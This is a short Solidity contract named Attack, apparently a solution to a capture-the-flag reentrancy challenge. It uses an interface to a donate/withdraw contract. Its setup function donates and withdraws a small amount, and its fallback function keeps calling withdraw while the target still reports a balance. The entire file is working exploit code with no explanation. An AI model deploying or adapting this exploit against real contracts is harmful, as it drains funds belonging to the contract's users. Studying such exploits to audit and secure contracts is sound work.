// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrancy {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
    function balanceOf(address _who) external view returns (uint balance);
}

contract Attack {

    address payable orgContract;

    constructor(address payable _instanceAddr) payable {
        orgContract = _instanceAddr;
    }

    uint256 public balance;

    function setup() public payable {
        IReentrancy(orgContract).donate{value: 0.0001 ether}(address(this));
        IReentrancy(orgContract).withdraw(0.0001 ether);
    }

    // Fallback function used to accept ether
    fallback() external payable {
        balance = IReentrancy(orgContract).balanceOf(address(this));
        if (balance > 0 ){
            IReentrancy(orgContract).withdraw(balance);
        }
    }
}